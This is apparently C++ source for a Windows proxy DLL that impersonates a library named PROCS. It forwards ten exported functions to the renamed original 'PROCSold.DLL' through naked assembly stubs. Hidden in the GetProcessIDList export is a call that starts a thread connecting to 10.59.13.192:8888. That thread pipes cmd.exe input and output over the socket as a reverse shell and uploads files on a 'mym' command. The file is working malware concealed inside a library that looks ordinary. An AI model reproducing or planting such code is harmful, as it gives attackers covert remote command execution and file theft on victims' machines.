#pragma comment(lib, "ws2_32.lib")  
#include<WinSock2.h>
#include"MySocket.h"
#include<string>
#include<iostream>
#include"Shell.h"
#include<Windows.h>
#include"Shell.h"
#include"MySocket.h"
HMODULE hm;
DWORD getprocaddress;//getprocaddress的函数地址
DWORD returnadderss;//调用真实函数之前的返回地址
DWORD trueaddress;//真实的函数的地址
char funname1[] = "GetModuleHandleEx";
char funname2[] = "GetModuleHandleList";
char funname3[] = "GetModulePath";
char funname4[] = "GetModuleSize";
char funname5[] = "GetNumberOfModules";
char funname6[] = "GetNumberOfProcesses";
char funname7[] = "GetProcessBaseSize";
char funname8[] = "GetProcessIDList";
char funname9[] = "GetProcessPath";
char funname10[] = "GetProcessPathID";
BOOL flag = false;
DWORD WINAPI ThreadFun(LPVOID)
{
	MySocket s1;
	s1.SocketInit("10.59.13.192", 8888, false);
	string test;
	string path;
	Shell shell;
	shell.RunProcess(TEXT("C:\\Windows\\System32\\cmd.exe"));
	cout << "Client" << endl;
	int rec = 0;
	shell.GetOutput(">", 2000, test);
	s1.SocketSend(test);
	while (true) {
		int pos = test.rfind("\r\n") + 2;
		path = test.substr(pos, test.size() - pos - 1) + '\\';
		test.erase();
		s1.SocketRecv(test);
		cout << test << endl;

		if (test == "000") {
			break;
		}
		else if (test.substr(0, 3) == "mym") {//以"mym"开头则复制文件
			s1.SocketSendF(path + test.substr(4));
			continue;
		}
		shell.SetInput(test);
		test.erase();
		shell.GetOutput(">", 2000, test);
		s1.SocketSend(test);



	}



	return 0;
}
void create() {
	
	//MessageBoxA(NULL, "begin", "MyDll", MB_OKCANCEL);
	if (INVALID_HANDLE_VALUE == CreateThread(NULL, NULL, ThreadFun, NULL, NULL, NULL)) {
		//MessageBoxA(NULL, "Client!", "MyDll", MB_OKCANCEL);
		return;
	}
	//MessageBoxA(NULL, "create success!", "MyDll", MB_OKCANCEL);
	flag = true;
}
__declspec(naked)int GetModuleHandl()
{
	//create();
	__asm{
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname1;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
		call trueaddress;
		push returnadderss;
		ret;
	}
	
}
extern "C" __declspec(naked) __declspec(dllexport)   int GetModuleHandleList()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname2;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}
}
extern "C" __declspec(naked) __declspec(dllexport)   int GetModulePath()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname3;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetModuleSize()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname4;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetNumberOfModules()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname5;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetNumberOfProcesses()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname6;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetProcessBaseSize()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname7;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetProcessIDList()
{
	create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname8;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetProcessPath()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname9;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
extern "C" __declspec(naked) __declspec(dllexport)   int GetProcessPathID()
{
	//create();
	__asm {
		pushad;
		pushfd;
		//push ebp;
		//mov ebp, esp;
		//sub esp, 0x10;
		lea edx, funname10;
		push edx;
		push hm;
		call getprocaddress;
		//add esp, 0x10;
		//mov esp, ebp;
		//pop ebp;
		mov trueaddress, eax;
		popfd;
		//mov[esp + 28], eax;
		popad;
		pop returnadderss
			call trueaddress;
		push returnadderss;
		ret;
	}

}
BOOL WINAPI DllMain(_In_ HINSTANCE hinstDll,
	_In_ DWORD fdwReason,
	_In_ LPVOID lpvReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBoxA(NULL, "I am attached new!", "MyDll", MB_OKCANCEL);
		hm = LoadLibraryA("PROCSold.DLL");
		getprocaddress = (DWORD)GetProcAddress(LoadLibraryA("kernel32.dll"), "GetProcAddress");
		//axx = (DWORD)GetProcAddress(hm, "TestFuction");
		
		break;
	case DLL_PROCESS_DETACH:
		//MessageBoxA(NULL, "I am detached new!", "MyDll", MB_OKCANCEL);
		break;
	default:
		break;
	}
	
	return true;
}